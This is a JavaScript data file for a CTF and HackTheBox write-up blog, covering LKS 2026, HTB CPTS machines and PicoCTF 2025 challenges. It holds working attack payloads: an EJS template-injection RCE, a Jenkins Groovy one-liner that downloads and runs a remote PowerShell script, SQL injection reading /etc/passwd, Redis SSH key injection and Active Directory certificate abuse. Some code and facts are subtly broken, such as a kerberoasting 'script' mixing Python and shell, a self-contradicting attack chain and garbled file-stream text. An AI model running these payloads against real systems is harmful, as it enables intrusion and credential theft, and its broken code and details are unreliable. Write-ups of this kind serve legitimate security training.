export const blogYears = [
  {
    year: '2026',
    events: [
      {
        id: 'lks-cyber-security-2026',
        slug: 'lks-cyber-security-2026',
        title: '1st Place LKS XXXIV Cyber Security - Semarang Track',
        thumbnail: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=800&q=80',
        description: 'Comprehensive walkthrough and technical report for city-level student competition (Semarang) covering web exploitation, cryptography, and network forensics.',
        author: {
          name: 'w1zard',
          avatar: '/me.png'
        },
        date: 'February 18, 2026',
        readTime: '28 min read',
        subpostsCount: 4,
        tags: ['#LKS2026', '#CyberSecurity', '#Semarang'],
        overview: {
          heading: 'What is LKS Cyber Security?',
          content: 'LKS (Lomba Kompetensi Siswa) Cyber Security is a national-standard competition evaluating vocational high school students on real-world cybersecurity disciplines including Incident Response, Penetration Testing, Cryptography, Digital Forensics, and System Hardening.',
          knowledgeDomains: [
            { domain: 'Web Exploitation', topics: 'SQLi, LFI, SSTI, JWT Manipulation, Deserialization' },
            { domain: 'Digital Forensics', topics: 'Wireshark PCAP analysis, Memory Dump Analysis, Disk Imaging' },
            { domain: 'Cryptography', topics: 'RSA key recovery, AES-CBC Padding Oracle, Custom Ciphers' },
            { domain: 'Reverse & Pwn', topics: 'GDB debugging, Buffer Overflow, Ghidra decompilation' }
          ]
        },
        subposts: [
          {
            id: 'lks-web-portal',
            slug: 'lks-web-portal',
            title: 'SecurePortal LKS (Semarang City)',
            category: 'Web Exploitation',
            readTime: '8 min read',
            date: 'February 18, 2026',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&q=80',
            description: 'Exploiting a misconfigured Node.js web portal with SSTI leading to Remote Code Execution.',
            executiveSummary: 'Identified a server-side template injection (SSTI) in the EJS rendering engine of the admin report generation endpoint. By crafting a custom JS payload, remote command execution was achieved, resulting in full server compromise.',
            poc: `import requests

url = "http://target-lks.local/render"
payload = {
    "name": "<%= global.process.mainModule.require('child_process').execSync('cat /flag.txt').toString() %>"
}

res = requests.post(url, json=payload)
print("[+] FLAG:", res.text.strip())`,
            template: `curl -X POST http://target-lks.local/render -H "Content-Type: application/json" -d '{"name":"<%= process.env %>"}'`,
            technicalReport: {
              reconnaissance: 'Nmap scan revealed HTTP port 8080 running an Express.js web application with a report generation feature.',
              enumeration: 'Inspecting request bodies showed string parameters being parsed directly by template engine functions.',
              exploitation: 'Submitted EJS payload evaluating Node.js child_process commands to read privileged flag files.',
              privilegeEscalation: 'The Express app was executing directly as root inside the target container environment.'
            },
            conclusion: 'Input parameter sanitization and escaping should always be enforced before passing user data to template engines. Render contexts should be strictly sandboxed.',
            flag: 'LKS{3js_ssti_t0_rce_smg_2026_w1nn3r}'
          },
          {
            id: 'lks-network-pcap',
            slug: 'lks-network-pcap',
            title: 'Exfiltration Packet Dump',
            category: 'Digital Forensics',
            readTime: '6 min read',
            date: 'February 18, 2026',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&q=80',
            description: 'Reconstructing exfiltrated sensitive files from ICMP tunneling traffic in Wireshark.',
            executiveSummary: 'An adversary exfiltrated sensitive database credentials using ICMP Echo Request payload fields. Extracted raw hex bytes from PCAP streams and decoded hidden zip archive contents.',
            poc: `from scapy.all import *

packets = rdpcap('evidence.pcap')
data = b''

for pkt in packets:
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        data += bytes(pkt[ICMP].payload)

with open('extracted.zip', 'wb') as f:
    f.write(data)

print("[+] Extracted payload saved to extracted.zip")`,
            template: `tshark -r evidence.pcap -Y "icmp.type == 8" -T fields -e data.data > exfiltrated.hex`,
            technicalReport: {
              reconnaissance: 'Analyzed 150MB PCAP file capturing internal host traffic.',
              enumeration: 'Filtered ICMP packets and noticed unusual payload lengths (128 bytes per echo request).',
              exploitation: 'Wrote Scapy script to stitch payload bytes chronologically.',
              privilegeEscalation: 'Decoded password-protected zip file using extracted key from HTTP headers.'
            },
            conclusion: 'Monitor ICMP payload sizes and establish firewall rules blocking outgoing ICMP traffic to unknown external IP addresses.',
            flag: 'LKS{1cmp_tunn3l_3xf1ltr4t10n_d3c0d3d}'
          },
          {
            id: 'lks-rsa-oracle',
            slug: 'lks-rsa-oracle',
            title: 'Faulty Key Generator',
            category: 'Cryptography',
            readTime: '7 min read',
            date: 'February 18, 2026',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1509228468518-180dd4864904?w=800&q=80',
            description: 'Recovering RSA private key when primes p and q share common factors with historical keypairs.',
            executiveSummary: 'Calculated the greatest common divisor (GCD) between the challenge public modulus N and historical public keys, successfully factoring N in less than a second.',
            poc: `import math
from Crypto.Util.number import long_to_bytes

N = 0xa39f... # Public Modulus
e = 65537
N2 = 0xb412... # Known Public Modulus

p = math.gcd(N, N2)
q = N // p
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)

# Decrypt ciphertext
ct = 0x5c2a...
pt = pow(ct, d, N)
print("[+] FLAG:", long_to_bytes(pt).decode())`,
            template: `python3 -c "import math; print(math.gcd(N1, N2))"`,
            technicalReport: {
              reconnaissance: 'Examined public key certificate parameters provided in the challenge archive.',
              enumeration: 'Noticed prime generation used a weak pseudo-random number generator seed.',
              exploitation: 'Executed Euclidean GCD algorithm against public key dump.',
              privilegeEscalation: 'Computed private exponent d and decrypted flag payload.'
            },
            conclusion: 'Ensure prime generation uses cryptographically secure random number generators (CSPRNG).',
            flag: 'LKS{rsa_sh4r3d_pr1m3s_gcd_f4ct0r3d}'
          },
          {
            id: 'lks-rev-vault',
            slug: 'lks-rev-vault',
            title: 'VaultKeeper Binary',
            category: 'Reverse Engineering',
            readTime: '7 min read',
            date: 'February 18, 2026',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&q=80',
            description: 'Decompiling ELF 64-bit binary in Ghidra and bypassing anti-debugging checks.',
            executiveSummary: 'Analyzed an ELF binary utilizing ptrace anti-debugging mechanisms. Patched the ptrace check with NOP instructions and extracted the hardcoded XOR key schedule.',
            poc: `def decrypt(encoded, key):
    return "".join(chr(b ^ key[i % len(key)]) for i, b in enumerate(encoded))

enc = [0x27, 0x1b, 0x07, 0x0b, 0x2e, 0x10, 0x3f, 0x05]
key = [0x5a, 0x4b, 0x3c]
print("[+] FLAG:", decrypt(enc, key))`,
            template: `gdb ./vaultkeeper -ex "catch syscall ptrace" -ex "run"`,
            technicalReport: {
              reconnaissance: 'Loaded 64-bit stripped ELF binary into Ghidra.',
              enumeration: 'Located main validation routine at 0x4011d6.',
              exploitation: 'Bypassed ptrace check using gdb set $rax=0 override.',
              privilegeEscalation: 'Dumping decrypted stack string variables.'
            },
            conclusion: 'Anti-debugging techniques only delay analysis; sensitive verification logic should be protected server-side.',
            flag: 'LKS{gh1dr4_ptr4c3_byp4ss_x0r_m4st3r}'
          }
        ]
      }
    ]
  },
  {
    year: '2025',
    events: [
      {
        id: 'htb-cpts-machine-track',
        slug: 'htb-cpts-machine-track',
        title: 'HackTheBox CPTS Machine Track',
        thumbnail: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&q=80',
        description: 'A collection of writeups for HackTheBox machines from the CPTS penetration testing path — covering AD abuse, web exploitation, privilege escalation, and more.',
        author: {
          name: 'w1zard',
          avatar: '/me.png'
        },
        date: 'December 29, 2025',
        readTime: '36 min read',
        subpostsCount: 5,
        tags: ['#HackTheBox', '#CPTS'],
        overview: {
          heading: 'What is HTB CPTS?',
          content: 'The HTB Certified Penetration Testing Specialist (HTB CPTS) is a highly hands-on certification issued by Hack The Box that assesses intermediate-level penetration testing skills. It covers the full pentest lifecycle — from reconnaissance and exploitation through lateral movement, AD attacks, and commercial-grade report writing.',
          knowledgeDomains: [
            { domain: 'Recon & OSINT', topics: 'Information gathering, footprinting, web recon' },
            { domain: 'Web Exploitation', topics: 'SQLi, XSS, LFI, file uploads, command injection' },
            { domain: 'Network Security', topics: 'Port scanning, service enumeration, protocol attacks' },
            { domain: 'Active Directory', topics: 'Kerberoasting, AS-REP roasting, BloodHound analysis, ESC1-ESC16' },
            { domain: 'Privilege Escalation', topics: 'Linux & Windows privesc, misconfigured services, SUID' }
          ]
        },
        subposts: [
          {
            id: 'fluffy-htb',
            slug: 'fluffy-htb',
            title: 'Fluffy (HackTheBox)',
            category: 'Web Exploitation',
            readTime: '9 min read',
            date: 'December 29, 2025',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&q=80',
            description: 'Assume Breach Machine from HackTheBox covering Attack Chain, Machine Enumeration, Nmap, SMB Enumeration, CVE-2025-24071 Exploit, and Bloodhound Analysis.',
            executiveSummary: 'Targeted a Windows machine vulnerable to SMB authentication coercion and unconstrained delegation. Abused AD CS certificate templates (ESC16) to forge Kerberos TGT tickets for Domain Admin privileges.',
            poc: `# Active Directory CS Exploitation via Certipy
certipy req -u 'p.agila@fluffy.local' -p 'P@ssw0rd2025' -target 'dc01.fluffy.local' -ca 'fluffy-DC01-CA' -template 'UserADCS' -upn 'administrator@fluffy.local'
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.240`,
            template: `nmap -sC -sV -p- 10.10.11.240 -oA nmap/fluffy`,
            technicalReport: {
              reconnaissance: 'Nmap scan revealed open ports 80, 88 (Kerberos), 135, 139, 445 (SMB), 389 (LDAP), and 636 (LDAPS).',
              enumeration: 'Enumerate SMB shares anonymously and found a backup archive containing domain username format P.Agila.',
              exploitation: 'Exploited CVE-2025-24071 SMB coercion to capture NTLMv2 hash, cracked password via Hashcat.',
              privilegeEscalation: 'Executed Bloodhound analysis, discovered unconstrained delegation path, issued Certipy request to claim Administrator ticket.'
            },
            conclusion: 'Disable vulnerable AD CS certificate templates and enforce SMB signing across domain controllers.',
            flag: 'HTB{fluffy_cpts_ad_cs_esc16_pwned_2025}'
          },
          {
            id: 'jeeves-htb',
            slug: 'jeeves-htb',
            title: 'Jeeves (HackTheBox)',
            category: 'Pwn',
            readTime: '3 min read',
            date: 'December 29, 2025',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&q=80',
            description: 'Jenkins web interface exploitation leading to PowerShell reverse shell and Alternate Data Stream (ADS) flag discovery.',
            executiveSummary: 'Leveraged unauthenticated Jenkins Groovy script console to gain initial access as user. Discovered hidden flag stored inside Windows NTFS Alternate Data Streams.',
            poc: `// Jenkins Groovy Script Execution Payload
def cmd = "powershell -c iwr -uri http://10.10.14.5/shell.ps1 -O C:\\Windows\\Temp\\s.ps1; powershell C:\\Windows\\Temp\\s.ps1"
def process = cmd.execute()
println process.text`,
            template: `dir /R C:\\Users\\Administrator\\Desktop`,
            technicalReport: {
              reconnaissance: 'Nmap identified Jetty web server running Jenkins on port 50000.',
              enumeration: 'Discovered script console accessible at /script without authentication.',
              exploitation: 'Executed Groovy script payload obtaining cmd.exe shell under user account.',
              privilegeEscalation: 'KeePass database file cracked using John the Ripper to obtain Administrator credentials. Flag hidden in NTFS streamhm.txt:root.txt.'
            },
            conclusion: 'Require authentication for CI/CD administrative consoles and restrict file stream permissions.',
            flag: 'HTB{j33v3s_j3nk1ns_4ds_str34m_fl4g}'
          },
          {
            id: 'trick-htb',
            slug: 'trick-htb',
            title: 'Trick (HackTheBox)',
            category: 'Web Exploitation',
            readTime: '7 min read',
            date: 'December 29, 2025',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=800&q=80',
            description: 'DNS zone transfer combined with SQL injection on subdomains and Fail2ban privilege escalation.',
            executiveSummary: 'Performed DNS zone transfer to discover hidden subdomains, exploited SQLi in market subdomain, and leveraged writable Fail2ban action scripts for root privilege escalation.',
            poc: `import requests

url = "http://market.trick.htb/index.php?page=item"
payload = "' UNION SELECT 1,2,load_file('/etc/passwd'),4-- -"
res = requests.get(url, params={"id": payload})
print(res.text)`,
            template: `dig axfr trick.htb @10.10.11.166`,
            technicalReport: {
              reconnaissance: 'DNS service on port 53 allowed zone transfer (axfr) revealing market.trick.htb.',
              enumeration: 'Web application vulnerable to blind SQL injection on item ID parameter.',
              exploitation: 'Extracted SSH private key for user michael via SQLi file reading.',
              privilegeEscalation: 'Michael had write permissions on Fail2ban action script. Triggered ban event to execute root bash reverse shell.'
            },
            conclusion: 'Restrict DNS zone transfers to authorized secondary DNS servers and restrict file ownership in fail2ban configuration directories.',
            flag: 'HTB{tr1ck_dns_sqli_f41l2b4n_r00t}'
          },
          {
            id: 'postman-htb',
            slug: 'postman-htb',
            title: 'Postman (HackTheBox)',
            category: 'Digital Forensics',
            readTime: '7 min read',
            date: 'December 29, 2025',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&q=80',
            description: 'Unauthenticated Redis RCE, SSH key injection, Webmin CVE-2019-15107 exploitation.',
            executiveSummary: 'Gained unauthenticated SSH access via Redis file writing vulnerability, cracked Matt\'s encrypted SSH key, and exploited Webmin Remote Code Execution for root access.',
            poc: `# Redis SSH Key Injection Script
redis-cli -h 10.10.10.160 config set dir /root/.ssh/
redis-cli -h 10.10.10.160 config set dbfilename authorized_keys
redis-cli -h 10.10.10.160 save`,
            template: `ssh -i id_rsa Matt@10.10.10.160`,
            technicalReport: {
              reconnaissance: 'Nmap scan revealed Redis server running on port 6379 without authentication.',
              enumeration: 'Discovered Webmin instance on port 10000.',
              exploitation: 'Used Redis to write public SSH key into Redis user authorized_keys file.',
              privilegeEscalation: 'Exploited Webmin CVE-2019-15107 password reset RCE parameter using Matt\'s credentials.'
            },
            conclusion: 'Bind Redis to localhost and enforce password authentication; upgrade Webmin packages.',
            flag: 'HTB{p0stm4n_r3d1s_w3bm1n_r00t_pwned}'
          },
          {
            id: 'vulncicada-htb',
            slug: 'vulncicada-htb',
            title: 'VulnCicada (HackTheBox)',
            category: 'Cryptography',
            readTime: '7 min read',
            date: 'December 29, 2025',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1509228468518-180dd4864904?w=800&q=80',
            description: 'Active Directory SMB password spraying, kerberoasting, and custom DLL sideloading escalation.',
            executiveSummary: 'Enumerated guest SMB share finding hardcoded domain password list, kerberoasted service tickets, and escalated to Domain Admin via DLL sideloading in internal service binary.',
            poc: `import impacket
from impacket.krb5.kerberoast import GetUserSPNs

# Kerberoasting script payload
GetUserSPNs.py cicada.local/emily:Password123 -dc-ip 10.10.11.222 -request`,
            template: `hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt`,
            technicalReport: {
              reconnaissance: 'Active Directory domain controller enumeration over RPC and SMB.',
              enumeration: 'Extracted cleartext passwords left in guest share descriptions.',
              exploitation: 'Kerberoasted user svc_pwn and cracked TGS ticket in Hashcat.',
              privilegeEscalation: 'Abused writable service folder to perform DLL sideloading injection.'
            },
            conclusion: 'Enforce strong Service Principal Name passwords and secure service installation paths.',
            flag: 'HTB{c1c4d4_k3rb3r04st_dll_s1d3l04d_2025}'
          }
        ]
      },
      {
        id: 'picoctf-2025-challenges',
        slug: 'picoctf-2025-challenges',
        title: 'PicoCTF 2025 - Global Track Writeups',
        thumbnail: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&q=80',
        description: 'Selected writeups for Web Exploitation and Cryptography challenges from PicoCTF 2025 global competition.',
        author: {
          name: 'w1zard',
          avatar: '/me.png'
        },
        date: 'October 12, 2025',
        readTime: '18 min read',
        subpostsCount: 3,
        tags: ['#PicoCTF', '#Binary', '#Crypto'],
        overview: {
          heading: 'What is PicoCTF?',
          content: 'PicoCTF is a global cybersecurity competition targeted at high school and university students created by Carnegie Mellon University experts.',
          knowledgeDomains: [
            { domain: 'Web Exploitation', topics: 'Cookie forgery, SQLi, CSRF, Header injections' },
            { domain: 'Cryptography', topics: 'RSA, substitution ciphers, Modular arithmetic' },
            { domain: 'Reverse Engineering', topics: 'Assembly reading, binary patch, gdb' }
          ]
        },
        subposts: [
          {
            id: 'pico-web-jwt',
            slug: 'pico-web-jwt',
            title: 'JWT Secret Cracker',
            category: 'Web Exploitation',
            readTime: '5 min read',
            date: 'October 12, 2025',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&q=80',
            description: 'Brute-forcing weak HMAC secret key in JWT token and forging admin payload.',
            executiveSummary: 'Cracked weak JWT signing key "secret123" using hashcat and re-signed the session cookie with admin privileges.',
            poc: `import jwt

secret = "secret123"
payload = {"user": "admin", "admin": True}
token = jwt.encode(payload, secret, algorithm="HS256")
print("[+] Forged Token:", token)`,
            template: `hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt`,
            technicalReport: {
              reconnaissance: 'Examined authorization header containing Bearer JWT token.',
              enumeration: 'Used hashcat mode 16500 to crack secret key in under 2 seconds.',
              exploitation: 'Forged admin session cookie and requested flag endpoint.',
              privilegeEscalation: 'Admin dashboard displayed flag directly.'
            },
            conclusion: 'Use strong 256-bit randomly generated keys for signing JWT tokens.',
            flag: 'picoCTF{jw7_s3cr37_cr4ck3d_succ3ss_2025}'
          },
          {
            id: 'pico-crypto-rsa',
            slug: 'pico-crypto-rsa',
            title: 'Mini RSA Exponent',
            category: 'Cryptography',
            readTime: '6 min read',
            date: 'October 12, 2025',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1509228468518-180dd4864904?w=800&q=80',
            description: 'Exploiting small public exponent e=3 without modulus wrap.',
            executiveSummary: 'Because e=3 and public modulus N was huge, m^3 < N. Took integer cube root of ciphertext directly to recover plain text flag.',
            poc: `import gmpy2
from Crypto.Util.number import long_to_bytes

c = 0x82a4... # Ciphertext
m, exact = gmpy2.iroot(c, 3)
print("[+] FLAG:", long_to_bytes(int(m)).decode())`,
            template: `python3 -c "import gmpy2; print(gmpy2.iroot(c, 3))"`,
            technicalReport: {
              reconnaissance: 'Inspected RSA parameters e=3 and N (2048 bits).',
              enumeration: 'Verified ciphertext c was smaller than N.',
              exploitation: 'Computed 3rd root directly without RSA private key.',
              privilegeEscalation: 'Decoded plaintext byte representation.'
            },
            conclusion: 'Always pad messages using OAEP padding to prevent direct root calculation attacks.',
            flag: 'picoCTF{sm4ll_3xp0n3n7_cub3_r007_2025}'
          },
          {
            id: 'pico-forensics-pcap',
            slug: 'pico-forensics-pcap',
            title: 'DNS Tunneling Probe',
            category: 'Digital Forensics',
            readTime: '7 min read',
            date: 'October 12, 2025',
            author: 'w1zard',
            image: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&q=80',
            description: 'Extracting base64 subdomain queries from captured DNS queries.',
            executiveSummary: 'Attacker used DNS TXT and A query subdomains to exfiltrate base64 encoded flag string.',
            poc: `import base64

subdomains = ["cGljb0NURns=", "ZG5zX3R1bm5lbA==", "X2V4ZmlsXzIwMjV9"]
decoded = "".join(base64.b64decode(s).decode() for s in subdomains)
print("[+] FLAG:", decoded)`,
            template: `tshark -r dns.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name`,
            technicalReport: {
              reconnaissance: 'Filtered DNS query names in Wireshark.',
              enumeration: 'Identified base64 strings prepended to domain queries.',
              exploitation: 'Joined and decoded base64 substrings.',
              privilegeEscalation: 'Reconstructed flag string.'
            },
            conclusion: 'Implement DNS monitoring and query length rate limiting.',
            flag: 'picoCTF{dns_tunn3l_b4s364_d3c0d3d}'
          }
        ]
      }
    ]
  }
];

export function getEventsByYear() {
  return blogYears;
}

export function getEventBySlug(eventSlug) {
  for (const yearObj of blogYears) {
    const found = yearObj.events.find(e => e.slug === eventSlug);
    if (found) return found;
  }
  return null;
}

export function getSubpost(eventSlug, challSlug) {
  const event = getEventBySlug(eventSlug);
  if (!event) return null;
  const subpost = event.subposts.find(s => s.slug === challSlug);
  if (!subpost) return null;
  return { event, subpost };
}
